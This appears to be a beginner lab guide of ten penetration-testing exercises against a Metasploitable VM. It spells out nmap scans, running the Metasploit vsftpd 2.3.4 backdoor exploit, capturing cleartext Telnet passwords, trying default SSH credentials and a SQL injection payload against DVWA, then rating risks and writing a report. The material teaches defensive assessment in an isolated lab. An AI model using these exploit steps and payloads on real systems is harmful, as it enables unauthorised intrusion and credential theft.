# 🎯 Labs: 10 Hands-On Exercises

Work through these in order. For each one, **write down what you did, what you found, and a screenshot**. By the end you'll have a real findings report.

> ⚠️ Run everything **only** against your own Metasploitable VM on the host-only network.

In the commands below, replace `TARGET` with your Metasploitable IP and `192.168.56.0/24` with your lab network.

---

## Lab 1: Find what's on the network
**Skill:** network discovery

```bash
sudo nmap -sn 192.168.56.0/24
```
✍️ **Record:** which IPs are alive? Which one is your target?

## Lab 2: Scan for open ports and services
**Skill:** service enumeration

```bash
sudo nmap -sV -p- TARGET -oN lab2-scan.txt
```
✍️ **Record:** list every open port, the service and its version. Which ones look old?

## Lab 3: Grab a banner by hand
**Skill:** manual enumeration

```bash
nc -nv TARGET 21
```
✍️ **Record:** what version of FTP does the banner show? Search that version name online. What do you find?

## Lab 4: Confirm a known vulnerability
**Skill:** vulnerability verification with Metasploit

The FTP service you found in Lab 3 (vsftpd 2.3.4) shipped with a known backdoor (CVE-2011-2523).

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET
run
```
✍️ **Record:** what access did you get? Run `whoami`. Why is this a **critical** finding?

## Lab 5: See passwords travel in cleartext
**Skill:** traffic analysis with Wireshark

1. On Kali, start Wireshark and capture on the host-only interface.
2. In a terminal, connect to the target with `telnet TARGET` and log in.
3. Stop the capture, right-click a Telnet packet, choose **Follow > TCP Stream**.

✍️ **Record:** can you read the username and password? What should replace Telnet?

## Lab 6: Default credentials
**Skill:** configuration review

Metasploitable shows its default login on its own login screen. Try those credentials against the SSH service from Kali:
```bash
ssh msfadmin@TARGET
```
✍️ **Record:** why are default credentials one of the most common real-world findings?

## Lab 7: Explore a vulnerable web app
**Skill:** web application basics

1. In Kali's browser, open `http://TARGET/dvwa` and log in with the credentials shown on the page.
2. Set **DVWA Security** to **low**.
3. Open **SQL Injection** and enter `1' OR '1'='1` in the User ID box.

✍️ **Record:** what happened? Look up "SQL injection" in the OWASP Top 10. How would a developer prevent this?

## Lab 8: Rate the risk
**Skill:** risk assessment

For every finding so far, give it a rating (Critical / High / Medium / Low) and one sentence explaining why. Use this table:

| # | Finding | Rating | Why it matters | Fix |
|---|---|---|---|---|
| 1 | vsftpd 2.3.4 backdoor | Critical | Gives an attacker a remote shell | Upgrade or remove the FTP service |
| 2 | | | | |

## Lab 9: See it from the defender's side *(Wazuh only)*
**Skill:** SIEM monitoring

1. With the Wazuh agent installed on Kali, run Lab 2's scan again.
2. Start SSH on Kali with `sudo systemctl start ssh`, then try 5 wrong passwords against it (`ssh wronguser@localhost`).
3. Open the Wazuh dashboard and find the alerts.

✍️ **Record:** what did the alert look like? How quickly did it appear? This is what a SOC analyst sees all day.

No Wazuh? Do LetsDefend's free SOC alert exercises instead.

## Lab 10: Write the report
**Skill:** communication (the skill most beginners skip)

Write a 1 to 2 page report with:
1. **Summary:** what you tested and the top 3 risks, in plain English for a manager
2. **Findings table:** from Lab 8
3. **Evidence:** your best screenshots
4. **Recommendations:** what to fix first

Save it as a PDF and share it on LinkedIn or in your own GitHub repo. Tag me, I'd love to see it. 🙌

---

## 🏁 Finished?

You've just done a small version of a real vulnerability assessment. Add it to your CV using the template in the [README](README.md#-put-it-on-your-cv), then check the [Tech-Jobs-Desk](https://github.com/OluwagaAy/Tech-Jobs-Desk) for roles to apply to.
